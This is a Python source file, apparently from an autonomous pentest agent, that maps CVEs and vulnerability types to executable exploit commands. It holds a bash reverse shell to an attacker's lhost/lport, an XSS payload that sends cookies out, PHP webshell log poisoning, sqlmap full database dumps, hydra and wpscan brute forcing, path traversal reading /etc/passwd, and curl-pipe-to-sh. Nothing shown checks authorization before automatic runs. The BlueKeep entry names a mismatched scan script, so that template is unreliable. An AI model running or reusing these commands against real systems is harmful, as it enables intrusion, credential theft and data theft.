"""
Exploit Template Database

Maps CVEs, vulnerability types, and services to executable exploit templates.
Provides the "what to run" when a vulnerability is discovered.

Integration Points:
- autonomous_agent.py: Uses get_exploit_for_finding() during exploitation phase
- tool_manager.py: Uses get_command_for_cve() for command generation
- vulnerability_kb.py: Shares vulnerability classification data
"""

import json
import logging
import os
import re
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from typing import Dict, List, Any, Optional, Tuple
from pathlib import Path

logger = logging.getLogger(__name__)


class ExploitCategory(Enum):
    """Categories of exploits"""
    WEB_INJECTION = "web_injection"
    WEB_XSS = "web_xss"
    WEB_SSRF = "web_ssrf"
    WEB_FILE_INCLUSION = "web_file_inclusion"
    WEB_AUTH_BYPASS = "web_auth_bypass"
    WEB_UPLOAD = "web_upload"
    NETWORK_RCE = "network_rce"
    NETWORK_PRIVESC = "network_privesc"
    NETWORK_DOS = "network_dos"
    SERVICE_EXPLOIT = "service_exploit"
    DEFAULT_CREDS = "default_creds"


class ExploitComplexity(Enum):
    """Complexity of exploitation"""
    LOW = "low"  # Single command, automatic
    MEDIUM = "medium"  # Requires parameters, may need adaptation
    HIGH = "high"  # Multi-step, requires chaining


@dataclass
class ExploitTemplate:
    """
    Template for an exploit that can be executed.
    
    Attributes:
        exploit_id: Unique identifier
        name: Human-readable name
        description: What this exploit does
        category: Type of exploit
        cve_ids: Associated CVE identifiers
        affected_services: Services this targets (e.g., "apache", "wordpress")
        affected_versions: Version patterns (e.g., "< 2.4.50", "1.0.0 - 1.5.0")
        tool: Primary tool to use
        command_template: Command with placeholders
        parameters: Required parameters and their descriptions
        success_indicators: Patterns indicating successful exploitation
        failure_indicators: Patterns indicating failure
        complexity: How complex is this to execute
        reliability: Success rate (0.0 - 1.0)
        references: URLs for more info
        tags: Searchable tags
        requires_auth: Whether authenticated access is needed
        dangerous: Whether this can cause damage
        last_updated: When this template was last updated
    """
    exploit_id: str
    name: str
    description: str
    category: ExploitCategory
    cve_ids: List[str] = field(default_factory=list)
    affected_services: List[str] = field(default_factory=list)
    affected_versions: List[str] = field(default_factory=list)
    tool: str = ""
    command_template: str = ""
    parameters: Dict[str, str] = field(default_factory=dict)
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)
    complexity: ExploitComplexity = ExploitComplexity.MEDIUM
    reliability: float = 0.5
    references: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    requires_auth: bool = False
    dangerous: bool = False
    last_updated: str = ""
    
    def __post_init__(self):
        if not self.last_updated:
            self.last_updated = datetime.now().isoformat()
        if isinstance(self.category, str):
            self.category = ExploitCategory(self.category)
        if isinstance(self.complexity, str):
            self.complexity = ExploitComplexity(self.complexity)
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for serialization"""
        d = asdict(self)
        d['category'] = self.category.value
        d['complexity'] = self.complexity.value
        return d
    
    @classmethod
    def from_dict(cls, data: Dict) -> 'ExploitTemplate':
        """Create from dictionary"""
        return cls(**data)
    
    def build_command(self, context: Dict[str, Any]) -> str:
        """
        Build executable command from template.
        
        Args:
            context: Dictionary with parameter values
                Required: target
                Optional: port, endpoint, parameter, payload, lhost, lport, etc.
        
        Returns:
            Executable command string
        """
        command = self.command_template
        
        # Standard substitutions
        substitutions = {
            '{target}': context.get('target', ''),
            '{url}': context.get('url', context.get('target', '')),
            '{host}': context.get('host', context.get('target', '').replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]),
            '{port}': str(context.get('port', '80')),
            '{endpoint}': context.get('endpoint', '/'),
            '{parameter}': context.get('parameter', 'id'),
            '{payload}': context.get('payload', ''),
            '{lhost}': context.get('lhost', '127.0.0.1'),
            '{lport}': str(context.get('lport', '4444')),
            '{username}': context.get('username', 'admin'),
            '{password}': context.get('password', 'password'),
            '{wordlist}': context.get('wordlist', '/usr/share/wordlists/rockyou.txt'),
            '{output}': context.get('output', '/tmp/exploit_output'),
            '{timeout}': str(context.get('timeout', '30')),
        }
        
        # Apply substitutions
        for placeholder, value in substitutions.items():
            command = command.replace(placeholder, value)
        
        # Apply custom parameters
        for param_name, param_desc in self.parameters.items():
            placeholder = '{' + param_name + '}'
            if placeholder in command:
                value = context.get(param_name, '')
                command = command.replace(placeholder, str(value))
        
        # Clean up any remaining empty placeholders
        command = re.sub(r'\{[^}]+\}', '', command)
        command = re.sub(r'\s+', ' ', command).strip()
        
        return command
    
    def validate_result(self, output: str) -> Tuple[bool, str]:
        """
        Check if exploit was successful based on output.
        
        Returns:
            Tuple of (success: bool, reason: str)
        """
        output_lower = output.lower()
        
        # Check for failure indicators first
        for indicator in self.failure_indicators:
            if indicator.lower() in output_lower:
                return False, f"Failure indicator found: {indicator}"
        
        # Check for success indicators
        for indicator in self.success_indicators:
            if indicator.lower() in output_lower:
                return True, f"Success indicator found: {indicator}"
        
        # Default to uncertain
        return False, "No clear success/failure indicators found"


class ExploitDatabase:
    """
    Database of exploit templates.
    
    Provides fast lookup by:
    - CVE ID
    - Vulnerability type
    - Service/version
    - Tool name
    
    Integrates with:
    - autonomous_agent.py for exploitation phase
    - tool_manager.py for command generation
    - vulnerability_kb.py for vulnerability data
    """
    
    def __init__(self, db_path: str = None):
        """
        Initialize exploit database.
        
        Args:
            db_path: Path to JSON database file. If None, uses default location.
        """
        if db_path is None:
            db_path = os.path.join(
                os.path.dirname(__file__),
                'data',
                'exploit_templates.json'
            )
        
        self.db_path = db_path
        self.templates: Dict[str, ExploitTemplate] = {}
        
        # Indexes for fast lookup
        self._cve_index: Dict[str, List[str]] = {}  # CVE -> [exploit_ids]
        self._service_index: Dict[str, List[str]] = {}  # service -> [exploit_ids]
        self._category_index: Dict[str, List[str]] = {}  # category -> [exploit_ids]
        self._tool_index: Dict[str, List[str]] = {}  # tool -> [exploit_ids]
        
        # Load existing database or initialize with defaults
        self._load_or_initialize()
        
        logger.info(f"[ExploitDB] Loaded {len(self.templates)} exploit templates")
    
    def _load_or_initialize(self):
        """Load database from file or initialize with defaults"""
        if os.path.exists(self.db_path):
            try:
                self._load_from_file()
                return
            except Exception as e:
                logger.warning(f"[ExploitDB] Failed to load from file: {e}")
        
        # Initialize with default templates
        self._initialize_default_templates()
        self._save_to_file()
    
    def _load_from_file(self):
        """Load templates from JSON file"""
        with open(self.db_path, 'r') as f:
            data = json.load(f)
        
        for template_data in data.get('templates', []):
            template = ExploitTemplate.from_dict(template_data)
            self._add_to_indexes(template)
            self.templates[template.exploit_id] = template
    
    def _save_to_file(self):
        """Save templates to JSON file"""
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        
        data = {
            'version': '1.0',
            'updated_at': datetime.now().isoformat(),
            'templates': [t.to_dict() for t in self.templates.values()]
        }
        
        with open(self.db_path, 'w') as f:
            json.dump(data, f, indent=2)
    
    def _add_to_indexes(self, template: ExploitTemplate):
        """Add template to lookup indexes"""
        exploit_id = template.exploit_id
        
        # CVE index
        for cve in template.cve_ids:
            if cve not in self._cve_index:
                self._cve_index[cve] = []
            self._cve_index[cve].append(exploit_id)
        
        # Service index
        for service in template.affected_services:
            service_key = service.lower()
            if service_key not in self._service_index:
                self._service_index[service_key] = []
            self._service_index[service_key].append(exploit_id)
        
        # Category index
        cat_key = template.category.value
        if cat_key not in self._category_index:
            self._category_index[cat_key] = []
        self._category_index[cat_key].append(exploit_id)
        
        # Tool index
        if template.tool:
            tool_key = template.tool.lower()
            if tool_key not in self._tool_index:
                self._tool_index[tool_key] = []
            self._tool_index[tool_key].append(exploit_id)
    
    def _initialize_default_templates(self):
        """Initialize database with common exploit templates"""
        
        default_templates = [
            # ==================== SQL INJECTION ====================
            ExploitTemplate(
                exploit_id="sqli_basic_union",
                name="SQL Injection - UNION Based",
                description="Exploits SQL injection using UNION SELECT to extract data",
                category=ExploitCategory.WEB_INJECTION,
                cve_ids=[],  # Generic technique
                affected_services=["mysql", "postgresql", "mssql", "oracle", "sqlite"],
                tool="sqlmap",
                command_template="sqlmap -u '{url}' --batch --level=3 --risk=2 --technique=U --dbs",
                parameters={
                    "url": "Target URL with injectable parameter (e.g., http://target/page?id=1)"
                },
                success_indicators=["available databases", "fetched data", "entries found", "database:"],
                failure_indicators=["not injectable", "no injection point", "all tested parameters"],
                complexity=ExploitComplexity.LOW,
                reliability=0.8,
                tags=["sqli", "union", "data_extraction"]
            ),
            
            ExploitTemplate(
                exploit_id="sqli_blind_boolean",
                name="SQL Injection - Boolean Blind",
                description="Exploits blind SQL injection using boolean-based inference",
                category=ExploitCategory.WEB_INJECTION,
                affected_services=["mysql", "postgresql", "mssql", "oracle", "sqlite"],
                tool="sqlmap",
                command_template="sqlmap -u '{url}' --batch --level=5 --risk=3 --technique=B --dbs --threads=5",
                parameters={
                    "url": "Target URL with injectable parameter"
                },
                success_indicators=["available databases", "fetched data", "injection type: boolean"],
                failure_indicators=["not injectable", "no injection point"],
                complexity=ExploitComplexity.MEDIUM,
                reliability=0.7,
                tags=["sqli", "blind", "boolean"]
            ),
            
            ExploitTemplate(
                exploit_id="sqli_time_based",
                name="SQL Injection - Time Based Blind",
                description="Exploits blind SQL injection using time delays",
                category=ExploitCategory.WEB_INJECTION,
                affected_services=["mysql", "postgresql", "mssql", "oracle"],
                tool="sqlmap",
                command_template="sqlmap -u '{url}' --batch --level=5 --risk=3 --technique=T --dbs --time-sec=2",
                parameters={
                    "url": "Target URL with injectable parameter"
                },
                success_indicators=["available databases", "injection type: time-based"],
                failure_indicators=["not injectable", "connection timed out"],
                complexity=ExploitComplexity.HIGH,
                reliability=0.6,
                tags=["sqli", "blind", "time-based"]
            ),
            
            ExploitTemplate(
                exploit_id="sqli_dump_all",
                name="SQL Injection - Full Database Dump",
                description="Dumps entire database after confirmed SQL injection",
                category=ExploitCategory.WEB_INJECTION,
                affected_services=["mysql", "postgresql", "mssql", "oracle", "sqlite"],
                tool="sqlmap",
                command_template="sqlmap -u '{url}' --batch --level=5 --risk=3 --dump-all --threads=10",
                parameters={
                    "url": "Target URL with confirmed injectable parameter"
                },
                success_indicators=["dumped to CSV", "entries found", "table:"],
                failure_indicators=["no data retrieved"],
                complexity=ExploitComplexity.LOW,
                reliability=0.85,
                dangerous=True,
                tags=["sqli", "dump", "data_extraction"]
            ),
            
            # ==================== XSS ====================
            ExploitTemplate(
                exploit_id="xss_reflected_basic",
                name="XSS - Reflected (Basic)",
                description="Tests for reflected XSS vulnerabilities",
                category=ExploitCategory.WEB_XSS,
                affected_services=["web"],
                tool="dalfox",
                command_template="dalfox url '{url}' --silence --no-color --format json",
                parameters={
                    "url": "Target URL with injectable parameter"
                },
                success_indicators=["Verified", "POC:", "Reflected"],
                failure_indicators=["not found", "no xss"],
                complexity=ExploitComplexity.LOW,
                reliability=0.75,
                tags=["xss", "reflected"]
            ),
            
            ExploitTemplate(
                exploit_id="xss_dom_based",
                name="XSS - DOM Based",
                description="Tests for DOM-based XSS vulnerabilities",
                category=ExploitCategory.WEB_XSS,
                affected_services=["web", "javascript"],
                tool="dalfox",
                command_template="dalfox url '{url}' --dom --silence --no-color",
                parameters={
                    "url": "Target URL"
                },
                success_indicators=["DOM XSS", "Verified", "sink:"],
                failure_indicators=["not found"],
                complexity=ExploitComplexity.MEDIUM,
                reliability=0.6,
                tags=["xss", "dom"]
            ),
            
            ExploitTemplate(
                exploit_id="xss_cookie_steal",
                name="XSS - Cookie Stealing Payload",
                description="Generates XSS payload for cookie exfiltration",
                category=ExploitCategory.WEB_XSS,
                affected_services=["web"],
                tool="xsser",
                command_template="xsser --url '{url}' --cookie-injection --Fp '<script>document.location=\"http://{lhost}:{lport}/steal?c=\"+document.cookie</script>'",
                parameters={
                    "url": "Target URL with XSS vulnerability",
                    "lhost": "Attacker IP to receive cookies",
                    "lport": "Attacker port to receive cookies"
                },
                success_indicators=["XSS found", "payload", "injected"],
                failure_indicators=["not vulnerable"],
                complexity=ExploitComplexity.MEDIUM,
                reliability=0.5,
                requires_auth=False,
                tags=["xss", "cookie", "steal"]
            ),
            
            # ==================== COMMAND INJECTION ====================
            ExploitTemplate(
                exploit_id="cmdi_basic",
                name="Command Injection - Basic",
                description="Tests for OS command injection",
                category=ExploitCategory.WEB_INJECTION,
                affected_services=["web", "cgi", "php"],
                tool="commix",
                command_template="commix --url='{url}' --batch --level=3",
                parameters={
                    "url": "Target URL with injectable parameter"
                },
                success_indicators=["command execution", "vulnerable", "pseudo-terminal"],
                failure_indicators=["not injectable", "all tested parameters"],
                complexity=ExploitComplexity.LOW,
                reliability=0.7,
                tags=["cmdi", "rce", "os_command"]
            ),
            
            ExploitTemplate(
                exploit_id="cmdi_reverse_shell",
                name="Command Injection - Reverse Shell",
                description="Exploits command injection to get a reverse shell",
                category=ExploitCategory.WEB_INJECTION,
                affected_services=["web", "cgi", "php", "linux"],
                tool="commix",
                command_template="commix --url='{url}' --batch --os-cmd='bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'",
                parameters={
                    "url": "Target URL with confirmed command injection",
                    "lhost": "Attacker IP for reverse shell",
                    "lport": "Attacker port for reverse shell"
                },
                success_indicators=["command executed", "shell"],
                failure_indicators=["blocked", "filtered"],
                complexity=ExploitComplexity.MEDIUM,
                reliability=0.6,
                dangerous=True,
                tags=["cmdi", "rce", "reverse_shell"]
            ),
            
            # ==================== FILE INCLUSION ====================
            ExploitTemplate(
                exploit_id="lfi_basic",
                name="LFI - Local File Inclusion",
                description="Tests for local file inclusion vulnerabilities",
                category=ExploitCategory.WEB_FILE_INCLUSION,
                affected_services=["web", "php"],
                tool="ffuf",
                command_template="ffuf -u '{url}' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0",
                parameters={
                    "url": "Target URL with FUZZ placeholder (e.g., http://target/page?file=FUZZ)"
                },
                success_indicators=["root:", "/etc/passwd", "www-data"],
                failure_indicators=["no results"],
                complexity=ExploitComplexity.LOW,
                reliability=0.65,
                tags=["lfi", "file_inclusion"]
            ),
            
            ExploitTemplate(
                exploit_id="lfi_log_poisoning",
                name="LFI - Log Poisoning RCE",
                description="Exploits LFI via log poisoning for code execution",
                category=ExploitCategory.WEB_FILE_INCLUSION,
                affected_services=["web", "php", "apache", "nginx"],
                tool="curl",
                command_template="curl -s -A '<?php system($_GET[\"cmd\"]); ?>' '{target}' && curl -s '{url}&cmd=id'",
                parameters={
                    "target": "Target to poison logs",
                    "url": "LFI URL pointing to log file"
                },
                success_indicators=["uid=", "www-data", "root"],
                failure_indicators=["not found", "permission denied"],
                complexity=ExploitComplexity.HIGH,
                reliability=0.4,
                dangerous=True,
                tags=["lfi", "log_poisoning", "rce"]
            ),
            
            # ==================== SSRF ====================
            ExploitTemplate(
                exploit_id="ssrf_basic",
                name="SSRF - Server-Side Request Forgery",
                description="Tests for SSRF vulnerabilities",
                category=ExploitCategory.WEB_SSRF,
                affected_services=["web"],
                tool="nuclei",
                command_template="nuclei -u '{target}' -t /root/nuclei-templates/vulnerabilities/ssrf/ -silent",
                parameters={
                    "target": "Target URL"
                },
                success_indicators=["ssrf", "internal", "localhost"],
                failure_indicators=["no results"],
                complexity=ExploitComplexity.MEDIUM,
                reliability=0.6,
                tags=["ssrf"]
            ),
            
            # ==================== AUTHENTICATION ====================
            ExploitTemplate(
                exploit_id="brute_http_basic",
                name="HTTP Basic Auth Brute Force",
                description="Brute forces HTTP Basic authentication",
                category=ExploitCategory.WEB_AUTH_BYPASS,
                affected_services=["web", "http"],
                tool="hydra",
                command_template="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt {host} http-get {endpoint}",
                parameters={
                    "host": "Target hostname",
                    "endpoint": "Protected endpoint path"
                },
                success_indicators=["login:", "password:", "valid"],
                failure_indicators=["0 valid passwords found"],
                complexity=ExploitComplexity.LOW,
                reliability=0.4,
                tags=["brute_force", "auth", "http_basic"]
            ),
            
            ExploitTemplate(
                exploit_id="brute_http_form",
                name="HTTP Form Brute Force",
                description="Brute forces HTTP form-based authentication",
                category=ExploitCategory.WEB_AUTH_BYPASS,
                affected_services=["web", "http"],
                tool="hydra",
                command_template="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt {host} http-post-form '{endpoint}:username=^USER^&password=^PASS^:{failure_string}'",
                parameters={
                    "host": "Target hostname",
                    "endpoint": "Login form endpoint",
                    "failure_string": "String indicating failed login"
                },
                success_indicators=["login:", "password:", "valid"],
                failure_indicators=["0 valid passwords found"],
                complexity=ExploitComplexity.MEDIUM,
                reliability=0.35,
                tags=["brute_force", "auth", "http_form"]
            ),
            
            ExploitTemplate(
                exploit_id="brute_ssh",
                name="SSH Brute Force",
                description="Brute forces SSH authentication",
                category=ExploitCategory.DEFAULT_CREDS,
                affected_services=["ssh"],
                tool="hydra",
                command_template="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://{host} -t 4",
                parameters={
                    "host": "Target hostname/IP"
                },
                success_indicators=["login:", "password:", "valid password"],
                failure_indicators=["0 valid passwords found"],
                complexity=ExploitComplexity.LOW,
                reliability=0.3,
                tags=["brute_force", "ssh", "auth"]
            ),
            
            # ==================== KNOWN CVEs ====================
            ExploitTemplate(
                exploit_id="cve_2021_44228_log4shell",
                name="Log4Shell (CVE-2021-44228)",
                description="Exploits Log4j RCE vulnerability",
                category=ExploitCategory.NETWORK_RCE,
                cve_ids=["CVE-2021-44228", "CVE-2021-45046"],
                affected_services=["java", "log4j", "apache"],
                affected_versions=["log4j < 2.17.0"],
                tool="nuclei",
                command_template="nuclei -u '{target}' -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -silent",
                parameters={
                    "target": "Target URL"
                },
                success_indicators=["log4j", "jndi", "ldap", "rmi"],
                failure_indicators=["not vulnerable"],
                complexity=ExploitComplexity.LOW,
                reliability=0.9,
                references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
                tags=["log4j", "log4shell", "rce", "critical"]
            ),
            
            ExploitTemplate(
                exploit_id="cve_2017_5638_struts",
                name="Apache Struts RCE (CVE-2017-5638)",
                description="Exploits Apache Struts Content-Type RCE",
                category=ExploitCategory.NETWORK_RCE,
                cve_ids=["CVE-2017-5638"],
                affected_services=["apache", "struts", "java"],
                affected_versions=["Struts 2.3.x < 2.3.32", "Struts 2.5.x < 2.5.10.1"],
                tool="nuclei",
                command_template="nuclei -u '{target}' -t /root/nuclei-templates/cves/2017/CVE-2017-5638.yaml -silent",
                parameters={
                    "target": "Target URL"
                },
                success_indicators=["struts", "ognl", "command executed"],
                failure_indicators=["not vulnerable"],
                complexity=ExploitComplexity.LOW,
                reliability=0.85,
                references=["https://nvd.nist.gov/vuln/detail/CVE-2017-5638"],
                tags=["struts", "rce", "critical"]
            ),
            
            ExploitTemplate(
                exploit_id="cve_2019_0708_bluekeep",
                name="BlueKeep (CVE-2019-0708)",
                description="Tests for BlueKeep RDP vulnerability",
                category=ExploitCategory.NETWORK_RCE,
                cve_ids=["CVE-2019-0708"],
                affected_services=["rdp", "windows"],
                affected_versions=["Windows 7", "Windows Server 2008"],
                tool="nmap",
                command_template="nmap -p 3389 --script rdp-vuln-ms12-020 {host}",
                parameters={
                    "host": "Target hostname/IP"
                },
                success_indicators=["VULNERABLE", "CVE-2019-0708"],
                failure_indicators=["NOT VULNERABLE", "filtered"],
                complexity=ExploitComplexity.MEDIUM,
                reliability=0.7,
                dangerous=True,
                references=["https://nvd.nist.gov/vuln/detail/CVE-2019-0708"],
                tags=["bluekeep", "rdp", "rce", "windows"]
            ),
            
            ExploitTemplate(
                exploit_id="cve_2021_41773_apache_path",
                name="Apache Path Traversal (CVE-2021-41773)",
                description="Exploits Apache HTTP Server path traversal",
                category=ExploitCategory.WEB_FILE_INCLUSION,
                cve_ids=["CVE-2021-41773", "CVE-2021-42013"],
                affected_services=["apache"],
                affected_versions=["Apache 2.4.49", "Apache 2.4.50"],
                tool="curl",
                command_template="curl -s --path-as-is '{target}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
                parameters={
                    "target": "Target URL"
                },
                success_indicators=["root:", "nobody:", "/bin/bash"],
                failure_indicators=["404", "403", "not found"],
                complexity=ExploitComplexity.LOW,
                reliability=0.85,
                references=["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"],
                tags=["apache", "path_traversal", "lfi"]
            ),
            
            ExploitTemplate(
                exploit_id="cve_2021_3129_laravel",
                name="Laravel Debug RCE (CVE-2021-3129)",
                description="Exploits Laravel Ignition debug mode RCE",
                category=ExploitCategory.NETWORK_RCE,
                cve_ids=["CVE-2021-3129"],
                affected_services=["laravel", "php"],
                affected_versions=["Laravel < 8.4.2", "Ignition < 2.5.2"],
                tool="nuclei",
                command_template="nuclei -u '{target}' -t /root/nuclei-templates/cves/2021/CVE-2021-3129.yaml -silent",
                parameters={
                    "target": "Target URL"
                },
                success_indicators=["CVE-2021-3129", "phar://"],
                failure_indicators=["not vulnerable"],
                complexity=ExploitComplexity.MEDIUM,
                reliability=0.75,
                references=["https://nvd.nist.gov/vuln/detail/CVE-2021-3129"],
                tags=["laravel", "php", "rce"]
            ),
            
            # ==================== WORDPRESS ====================
            ExploitTemplate(
                exploit_id="wp_xmlrpc_brute",
                name="WordPress XML-RPC Brute Force",
                description="Brute forces WordPress via XML-RPC amplification",
                category=ExploitCategory.WEB_AUTH_BYPASS,
                affected_services=["wordpress"],
                tool="wpscan",
                command_template="wpscan --url '{target}' --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50",
                parameters={
                    "target": "WordPress URL"
                },
                success_indicators=["Valid Combinations Found", "Password:"],
                failure_indicators=["No Valid Passwords Found"],
                complexity=ExploitComplexity.LOW,
                reliability=0.4,
                tags=["wordpress", "brute_force", "xmlrpc"]
            ),
            
            ExploitTemplate(
                exploit_id="wp_plugin_vuln",
                name="WordPress Plugin Vulnerability Scan",
                description="Scans for vulnerable WordPress plugins",
                category=ExploitCategory.WEB_INJECTION,
                affected_services=["wordpress"],
                tool="wpscan",
                command_template="wpscan --url '{target}' --enumerate vp --plugins-detection aggressive --api-token {api_token}",
                parameters={
                    "target": "WordPress URL",
                    "api_token": "WPScan API token (optional)"
                },
                success_indicators=["vulnerabilities identified", "CVE-", "exploit"],
                failure_indicators=["No plugins Found"],
                complexity=ExploitComplexity.LOW,
                reliability=0.7,
                tags=["wordpress", "plugin", "vulnerability"]
            ),
            
            # ==================== PRIVILEGE ESCALATION ====================
            ExploitTemplate(
                exploit_id="privesc_linux_enum",
                name="Linux Privilege Escalation Enumeration",
                description="Enumerates Linux system for privilege escalation vectors",
                category=ExploitCategory.NETWORK_PRIVESC,
                affected_services=["linux"],
                tool="linpeas",
                command_template="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                parameters={},
                success_indicators=["99%", "CVE-", "SUID", "sudo", "writable"],
                failure_indicators=[],
                complexity=ExploitComplexity.LOW,
                reliability=0.9,
                tags=["privesc", "linux", "enumeration"]
            ),
            
            ExploitTemplate(
                exploit_id="privesc_windows_enum",
                name="Windows Privilege Escalation Enumeration",
                description="Enumerates Windows system for privilege escalation vectors",
                category=ExploitCategory.NETWORK_PRIVESC,
                affected_services=["windows"],
                tool="winpeas",
                command_template="winpeas.exe",
                parameters={},
                success_indicators=["99%", "CVE-", "AlwaysInstallElevated", "Unquoted"],
                failure_indicators=[],
                complexity=ExploitComplexity.LOW,
                reliability=0.9,
                tags=["privesc", "windows", "enumeration"]
            ),
        ]
        
        # Add all templates
        for template in default_templates:
            self.add_template(template)
    
    def add_template(self, template: ExploitTemplate) -> bool:
        """
        Add or update an exploit template.
        
        Args:
            template: ExploitTemplate to add
            
        Returns:
            True if added successfully
        """
        self._add_to_indexes(template)
        self.templates[template.exploit_id] = template
        return True
    
    def get_template(self, exploit_id: str) -> Optional[ExploitTemplate]:
        """Get template by ID"""
        return self.templates.get(exploit_id)
    
    def get_by_cve(self, cve_id: str) -> List[ExploitTemplate]:
        """Get all templates for a CVE"""
        exploit_ids = self._cve_index.get(cve_id.upper(), [])
        return [self.templates[eid] for eid in exploit_ids if eid in self.templates]
    
    def get_by_service(self, service: str) -> List[ExploitTemplate]:
        """Get all templates for a service"""
        exploit_ids = self._service_index.get(service.lower(), [])
        return [self.templates[eid] for eid in exploit_ids if eid in self.templates]
    
    def get_by_category(self, category: ExploitCategory) -> List[ExploitTemplate]:
        """Get all templates for a category"""
        exploit_ids = self._category_index.get(category.value, [])
        return [self.templates[eid] for eid in exploit_ids if eid in self.templates]
    
    def get_by_tool(self, tool: str) -> List[ExploitTemplate]:
        """Get all templates for a tool"""
        exploit_ids = self._tool_index.get(tool.lower(), [])
        return [self.templates[eid] for eid in exploit_ids if eid in self.templates]
    
    def search(self, query: str) -> List[ExploitTemplate]:
        """Search templates by name, description, or tags"""
        query_lower = query.lower()
        results = []
        
        for template in self.templates.values():
            if (query_lower in template.name.lower() or
                query_lower in template.description.lower() or
                any(query_lower in tag for tag in template.tags)):
                results.append(template)
        
        return results
    
    def get_exploit_for_finding(
        self,
        finding: Dict[str, Any],
        context: Dict[str, Any] = None
    ) -> Optional[Tuple[ExploitTemplate, str]]:
        """
        Get the best exploit template for a vulnerability finding.
        
        This is the main integration point with autonomous_agent.py.
        
        Args:
            finding: Vulnerability finding from a scan
            context: Additional context (target, phase, etc.)
            
        Returns:
            Tuple of (ExploitTemplate, executable_command) or None
        """
        context = context or {}
        
        # Check for CVE first
        cve_ids = finding.get('cve_ids', []) or finding.get('cve', [])
        if isinstance(cve_ids, str):
            cve_ids = [cve_ids]
        
        for cve_id in cve_ids:
            templates = self.get_by_cve(cve_id)
            if templates:
                # Sort by reliability
                templates.sort(key=lambda t: t.reliability, reverse=True)
                template = templates[0]
                command = template.build_command(context)
                return template, command
        
        # Check by vulnerability type
        vuln_type = finding.get('type', '').lower()
        type_to_category = {
            'sql_injection': ExploitCategory.WEB_INJECTION,
            'sqli': ExploitCategory.WEB_INJECTION,
            'xss': ExploitCategory.WEB_XSS,
            'cross-site scripting': ExploitCategory.WEB_XSS,
            'command_injection': ExploitCategory.WEB_INJECTION,
            'rce': ExploitCategory.NETWORK_RCE,
            'lfi': ExploitCategory.WEB_FILE_INCLUSION,
            'rfi': ExploitCategory.WEB_FILE_INCLUSION,
            'ssrf': ExploitCategory.WEB_SSRF,
            'auth_bypass': ExploitCategory.WEB_AUTH_BYPASS,
        }
        
        category = type_to_category.get(vuln_type)
        if category:
            templates = self.get_by_category(category)
            if templates:
                # Sort by reliability
                templates.sort(key=lambda t: t.reliability, reverse=True)
                template = templates[0]
                command = template.build_command(context)
                return template, command
        
        # Check by affected service
        service = finding.get('service', '') or context.get('service', '')
        if service:
            templates = self.get_by_service(service)
            if templates:
                templates.sort(key=lambda t: t.reliability, reverse=True)
                template = templates[0]
                command = template.build_command(context)
                return template, command
        
        return None
    
    def get_command_for_cve(
        self,
        cve_id: str,
        context: Dict[str, Any]
    ) -> Optional[str]:
        """
        Get executable command for a specific CVE.
        
        Integration point with tool_manager.py.
        
        Args:
            cve_id: CVE identifier
            context: Execution context with target, port, etc.
            
        Returns:
            Executable command string or None
        """
        templates = self.get_by_cve(cve_id)
        if not templates:
            return None
        
        # Get most reliable template
        template = max(templates, key=lambda t: t.reliability)
        return template.build_command(context)
    
    def save(self):
        """Save database to file"""
        self._save_to_file()
        logger.info(f"[ExploitDB] Saved {len(self.templates)} templates to {self.db_path}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get database statistics"""
        return {
            "total_templates": len(self.templates),
            "cves_covered": len(self._cve_index),
            "services_covered": len(self._service_index),
            "categories": {cat: len(ids) for cat, ids in self._category_index.items()},
            "tools": list(self._tool_index.keys()),
        }


# Singleton instance
_exploit_db: Optional[ExploitDatabase] = None


def get_exploit_database() -> ExploitDatabase:
    """Get singleton ExploitDatabase instance"""
    global _exploit_db
    if _exploit_db is None:
        _exploit_db = ExploitDatabase()
    return _exploit_db
